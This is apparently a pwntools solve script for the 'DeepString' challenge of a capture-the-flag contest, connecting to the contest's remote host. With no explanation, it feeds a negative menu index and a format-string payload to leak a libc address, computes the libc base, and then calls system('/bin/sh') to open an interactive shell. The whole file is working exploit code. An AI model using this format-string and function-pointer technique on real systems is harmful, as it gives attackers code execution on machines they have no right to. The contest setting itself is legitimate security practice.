#!/usr/bin/env python3

from pwn import *

exe = ELF("DeepString")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# p = process(exe.path)
# gdb.attach(p)

p = remote("deepstring.wolvctf.io", 1337)

payload = b"%p%p%p%p"
payload += p64(exe.sym["reflect"])

p.recvuntil(b"3) reverse")
p.recvline()
p.sendline(b"-37")

p.sendlineafter(b"STRING:", payload)
p.recvline()

libc_leak = int(p.recvline()[:14], 16)
libc.address = libc_leak - 0x1d2b03
log.success(f"{hex(libc.address)=}")

second_payload = b"/bin/sh\x00"
second_payload += p64(libc.sym["system"])

p.recvuntil(b"3) reverse")
p.recvline()
p.sendline(b"-37")

p.sendlineafter(b"STRING:", second_payload)
p.recvline()

p.interactive()